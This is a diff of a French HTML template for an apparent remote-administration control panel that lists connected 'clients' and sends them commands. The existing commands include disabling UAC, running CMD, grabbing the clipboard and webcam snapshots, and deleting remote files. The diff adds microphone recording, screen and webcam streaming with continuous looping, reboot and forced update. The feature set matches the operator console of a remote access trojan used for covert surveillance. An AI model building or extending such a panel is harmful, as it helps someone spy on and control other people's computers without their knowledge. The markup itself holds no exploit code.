@@ -8,7 +8,6 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
     <style>
-        /* Styles supplémentaires pour les nouvelles fonctionnalités */
         .dashboard-actions {
             display: flex;
             gap: 10px;
@@ -55,12 +54,16 @@
         }
         .refresh-spinning { animation: spinRefresh 1s linear infinite; }
         @keyframes spinRefresh { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        .stream-controls {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 12px;
+        }
     </style>
 </head>
 <body>
     <div id="notification-container"></div>
     <div class="app-container">
-        <!-- SIDEBAR -->
         <aside class="sidebar">
             <div class="sidebar-brand">
                 <div class="brand-icon">
@@ -91,7 +94,6 @@
             </div>
         </aside>
 
-        <!-- MAIN CONTENT -->
         <main class="main-content">
             <header class="topbar">
                 <h1 id="page-title" class="topbar-title">Dashboard</h1>
@@ -106,7 +108,6 @@
                 </div>
             </header>
 
-            <!-- DASHBOARD PAGE -->
             <div id="dashboard-page" class="page active">
                 <div class="stats-grid">
                     <div class="stat-card">
@@ -157,7 +158,7 @@
                     <button class="btn btn-outline btn-sm btn-danger-outline" onclick="disableUacSelected()">
                         <i class="fas fa-shield-alt"></i> Désactiver UAC
                     </button>
-                    <button class="btn btn-outline btn-sm btn-success-outline" onclick="enableUacSelected()">
+                    <button class="btn btn-outline btn-sm" style="border-color: var(--green); color: var(--green); background: transparent;" onclick="enableUacSelected()">
                         <i class="fas fa-shield-alt"></i> Activer UAC
                     </button>
                 </div>
@@ -168,7 +169,6 @@
                 </div>
             </div>
 
-            <!-- CLIENTS PAGE -->
             <div id="clients-page" class="page">
                 <div class="section-header">
                     <input type="text" id="client-search" class="search-input" placeholder="Rechercher un client..." onkeyup="filterClients()">
@@ -183,7 +183,7 @@
         <div class="modal-content command-modal-content">
             <div class="modal-header">
                 <h2><i class="fas fa-terminal"></i> Commande</h2>
-                <span class="modal-close" onclick="closeModal()">&times;</span>
+                <span class="modal-close" onclick="forceCloseModal()">&times;</span>
             </div>
             <div class="modal-body">
                 <p class="modal-client-name">Client : <strong id="modal-client-name"></strong></p>
@@ -219,6 +219,15 @@
                             <div class="custom-option" data-value="screenshot_webcam">
                                 <i class="fas fa-video" style="color:#8b8fa5;"></i> Webcam
                             </div>
+                            <div class="custom-option" data-value="capture_audio">
+                                <i class="fas fa-microphone" style="color:#8b8fa5;"></i> Audio
+                            </div>
+                            <div class="custom-option" data-value="stream_screen">
+                                <i class="fas fa-desktop" style="color:#8b8fa5;"></i> Stream Ecran
+                            </div>
+                            <div class="custom-option" data-value="stream_webcam">
+                                <i class="fas fa-video" style="color:#8b8fa5;"></i> Stream Webcam
+                            </div>
                             <div class="custom-option" data-value="clipboard">
                                 <i class="fas fa-copy" style="color:#8b8fa5;"></i> Presse-papier
                             </div>
@@ -233,6 +242,12 @@
                             </div>
                             <div class="custom-option" data-value="execute_cmd">
                                 <i class="fas fa-terminal" style="color:#8b8fa5;"></i> CMD
+                            </div>
+                            <div class="custom-option" data-value="reboot">
+                                <i class="fas fa-power-off" style="color:var(--red);"></i> Redémarrer
+                            </div>
+                            <div class="custom-option" data-value="force_update">
+                                <i class="fas fa-download" style="color:var(--accent);"></i> Force Update
                             </div>
                         </div>
                     </div>
@@ -267,27 +282,243 @@
         <div class="modal-content modal-result">
             <div class="modal-header">
                 <h2 id="result-title"><i class="fas fa-check-circle"></i> Resultat</h2>
-                <span class="modal-close" onclick="closeResultModal()">&times;</span>
+                <span class="modal-close" onclick="forceCloseResultModal()">&times;</span>
             </div>
             <div class="modal-body" id="result-content"></div>
         </div>
     </div>
 
-    <!-- MODAL CONFIRMATION SUPPRESSION -->
+    <!-- MODAL PARAMÈTRES AUDIO -->
+    <div id="audio-settings-modal" class="modal">
+        <div class="modal-content stream-settings-content">
+            <div class="modal-header">
+                <h2><i class="fas fa-microphone"></i> Paramètres Audio</h2>
+                <span class="modal-close" onclick="closeAudioSettingsModal()">&times;</span>
+            </div>
+            <div class="modal-body">
+                <div class="settings-group">
+                    <div class="settings-label"><i class="fas fa-hourglass-half"></i> Durée d'enregistrement</div>
+                    <div class="duration-picker">
+                        <div class="duration-field">
+                            <input type="number" id="audio-hours" min="0" max="24" value="0" step="1">
+                            <span>heures</span>
+                        </div>
+                        <div class="duration-field">
+                            <input type="number" id="audio-minutes" min="0" max="59" value="1" step="1">
+                            <span>minutes</span>
+                        </div>
+                        <div class="duration-field">
+                            <input type="number" id="audio-seconds" min="0" max="59" value="0" step="1">
+                            <span>secondes</span>
+                        </div>
+                    </div>
+                    <div class="duration-preview" id="audio-preview">
+                        <i class="fas fa-info-circle"></i> Durée totale: 1m 0s
+                    </div>
+                </div>
+                <div class="settings-group">
+                    <div class="settings-label"><i class="fas fa-microphone-alt"></i> Source audio (Entrée)</div>
+                    <select id="audio-input-device" class="fps-select">
+                        <option value="">Chargement...</option>
+                    </select>
+                </div>
+                <div class="settings-group">
+                    <div class="settings-label"><i class="fas fa-volume-up"></i> Sortie audio (Stream écran)</div>
+                    <select id="audio-output-device" class="fps-select">
+                        <option value="none">Aucun son</option>
+                    </select>
+                </div>
+                <div class="settings-group">
+                    <div class="settings-label"><i class="fas fa-chart-line"></i> Qualité</div>
+                    <div class="quality-options">
+                        <label class="quality-option">
+                            <input type="radio" name="audio-quality" value="8000">
+                            <span class="quality-badge low">8 kHz</span>
+                        </label>
+                        <label class="quality-option">
+                            <input type="radio" name="audio-quality" value="16000" checked>
+                            <span class="quality-badge medium">16 kHz</span>
+                        </label>
+                        <label class="quality-option">
+                            <input type="radio" name="audio-quality" value="44100">
+                            <span class="quality-badge high">44.1 kHz</span>
+                        </label>
+                        <label class="quality-option">
+                            <input type="radio" name="audio-quality" value="48000">
+                            <span class="quality-badge">48 kHz</span>
+                        </label>
+                    </div>
+                </div>
+                <div class="settings-group">
+                    <label class="toggle-label">
+                        <input type="checkbox" id="audio-playback">
+                        <span class="toggle-slider"></span>
+                        <span class="toggle-text">Lire automatiquement après capture</span>
+                    </label>
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button class="btn btn-outline" onclick="closeAudioSettingsModal()">Annuler</button>
+                <button class="btn btn-primary" onclick="startAudioCapture()"><i class="fas fa-play"></i> Capturer</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- MODAL PARAMÈTRES STREAM ÉCRAN (MODIFIÉ - PAS DE FPS) -->
+    <div id="screen-settings-modal" class="modal">
+        <div class="modal-content stream-settings-content" style="max-width: 800px;">
+            <div class="modal-header">
+                <h2><i class="fas fa-desktop"></i> Paramètres Stream Écran</h2>
+                <span class="modal-close" onclick="closeScreenSettingsModal()">&times;</span>
+            </div>
+            <div class="modal-body">
+                <div class="settings-group">
+                    <div class="settings-label"><i class="fas fa-tv"></i> Écrans disponibles</div>
+                    <div id="monitors-list" class="monitors-grid"></div>
+                </div>
+                <div class="settings-group">
+                    <div class="settings-label"><i class="fas fa-tachometer-alt"></i> Qualité vidéo</div>
+                    <div class="quality-options">
+                        <label class="quality-option">
+                            <input type="radio" name="screen-quality" value="480p">
+                            <span class="quality-badge low">480p</span>
+                            <span class="quality-desc">640x480</span>
+                        </label>
+                        <label class="quality-option">
+                            <input type="radio" name="screen-quality" value="720p" checked>
+                            <span class="quality-badge medium">720p</span>
+                            <span class="quality-desc">1280x720</span>
+                        </label>
+                        <label class="quality-option">
+                            <input type="radio" name="screen-quality" value="1080p">
+                            <span class="quality-badge high">1080p</span>
+                            <span class="quality-desc">1920x1080</span>
+                        </label>
+                        <label class="quality-option">
+                            <input type="radio" name="screen-quality" value="original">
+                            <span class="quality-badge">Original</span>
+                        </label>
+                    </div>
+                </div>
+                <div class="settings-group">
+                    <div class="settings-label"><i class="fas fa-film"></i> Durée d'enregistrement</div>
+                    <div style="display: flex; gap: 20px; flex-wrap: wrap;">
+                        <div class="duration-field">
+                            <input type="number" id="screen-duration" min="1" max="300" value="30">
+                            <span>secondes</span>
+                        </div>
+                        <label class="toggle-label">
+                            <input type="checkbox" id="screen-loop">
+                            <span class="toggle-slider"></span>
+                            <span class="toggle-text">Boucle continue</span>
+                        </label>
+                    </div>
+                    <div class="duration-preview" style="margin-top: 8px;">
+                        <i class="fas fa-info-circle"></i> Fluidité: 30 images/seconde (optimale)
+                    </div>
+                </div>
+                <div class="settings-group">
+                    <div class="settings-label"><i class="fas fa-microphone"></i> Audio système</div>
+                    <label class="toggle-label">
+                        <input type="checkbox" id="screen-capture-audio">
+                        <span class="toggle-slider"></span>
+                        <span class="toggle-text">Capturer le son de l'ordinateur</span>
+                    </label>
+                    <select id="screen-audio-device" class="fps-select" style="margin-top: 10px; display: none;">
+                        <option value="">Sélectionner une source audio...</option>
+                    </select>
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button class="btn btn-outline" onclick="closeScreenSettingsModal()">Annuler</button>
+                <button class="btn btn-primary" onclick="startScreenStream()"><i class="fas fa-play"></i> Démarrer l'enregistrement</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- MODAL PARAMÈTRES WEBCAM (MODIFIÉ - PAS DE FPS) -->
+    <div id="webcam-settings-modal" class="modal">
+        <div class="modal-content stream-settings-content" style="max-width: 700px;">
+            <div class="modal-header">
+                <h2><i class="fas fa-video"></i> Paramètres Webcam</h2>
+                <span class="modal-close" onclick="closeWebcamSettingsModal()">&times;</span>
+            </div>
+            <div class="modal-body">
+                <div class="settings-group">
+                    <div class="settings-label"><i class="fas fa-camera"></i> Webcams disponibles</div>
+                    <div id="webcams-list" class="webcams-grid"></div>
+                </div>
+                <div class="settings-group">
+                    <div class="settings-label"><i class="fas fa-tachometer-alt"></i> Qualité</div>
+                    <div class="quality-options">
+                        <label class="quality-option">
+                            <input type="radio" name="webcam-quality" value="480p">
+                            <span class="quality-badge low">480p</span>
+                        </label>
+                        <label class="quality-option">
+                            <input type="radio" name="webcam-quality" value="720p" checked>
+                            <span class="quality-badge medium">720p</span>
+                        </label>
+                        <label class="quality-option">
+                            <input type="radio" name="webcam-quality" value="1080p">
+                            <span class="quality-badge high">1080p</span>
+                        </label>
+                    </div>
+                </div>
+                <div class="settings-group">
+                    <div class="settings-label"><i class="fas fa-hourglass-half"></i> Durée d'enregistrement</div>
+                    <div style="display: flex; gap: 20px; flex-wrap: wrap;">
+                        <div class="duration-field">
+                            <input type="number" id="webcam-duration" min="1" max="300" value="30">
+                            <span>secondes</span>
+                        </div>
+                    </div>
+                    <div class="duration-preview" style="margin-top: 8px;">
+                        <i class="fas fa-info-circle"></i> Fluidité: 30 images/seconde (optimale)
+                    </div>
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button class="btn btn-outline" onclick="closeWebcamSettingsModal()">Annuler</button>
+                <button class="btn btn-primary" onclick="startWebcamStream()"><i class="fas fa-play"></i> Démarrer</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- MODAL SUPPRESSION CONFIRMATION -->
     <div id="delete-confirm-modal" class="modal">
         <div class="modal-content modal-delete-confirm">
             <div class="modal-header">
-                <h2><i class="fas fa-trash" style="color:var(--red);"></i> Confirmer la suppression</h2>
+                <h2><i class="fas fa-trash-alt"></i> Confirmer la suppression</h2>
                 <span class="modal-close" onclick="closeDeleteConfirmModal()">&times;</span>
             </div>
             <div class="modal-body">
-                <p style="color:var(--text-secondary);margin-bottom:12px;">Vous etes sur le point de supprimer ce <strong id="delete-confirm-label"></strong> de façon permanente :</p>
+                <p style="color:var(--text-secondary);margin-bottom:12px;">Vous êtes sur le point de supprimer ce <strong id="delete-confirm-label"></strong> de façon permanente :</p>
                 <div class="delete-confirm-path-box"><code id="delete-confirm-path"></code></div>
-                <p style="color:var(--red);font-size:12px;margin-top:12px;"><i class="fas fa-exclamation-triangle"></i> Cette action est irreversible.</p>
+                <p style="color:var(--red);font-size:12px;margin-top:12px;"><i class="fas fa-exclamation-triangle"></i> Cette action est irréversible.</p>
             </div>
             <div class="modal-footer">
                 <button class="btn btn-outline" onclick="closeDeleteConfirmModal()">Annuler</button>
                 <button class="btn btn-danger" onclick="confirmDeleteRemotePath()"><i class="fas fa-trash"></i> Supprimer</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- MODAL LECTURE VIDÉO -->
+    <div id="video-player-modal" class="modal">
+        <div class="modal-content" style="width: 90%; max-width: 1200px;">
+            <div class="modal-header">
+                <h2><i class="fas fa-video"></i> Lecture vidéo</h2>
+                <span class="modal-close" onclick="closeVideoPlayer()">&times;</span>
+            </div>
+            <div class="modal-body" id="video-player-container">
+                <video id="video-player" controls style="width: 100%; max-height: 70vh;" preload="auto">
+                    Votre navigateur ne supporte pas la lecture vidéo.
+                </video>
+                <div class="video-controls" style="margin-top: 12px; display: flex; gap: 10px; flex-wrap: wrap;">
+                    <button class="btn btn-primary btn-sm" onclick="downloadVideo()"><i class="fas fa-download"></i> Télécharger MP4</button>
+                    <button class="btn btn-outline btn-sm" onclick="closeVideoPlayer()"><i class="fas fa-times"></i> Fermer</button>
+                </div>
             </div>
         </div>
     </div>
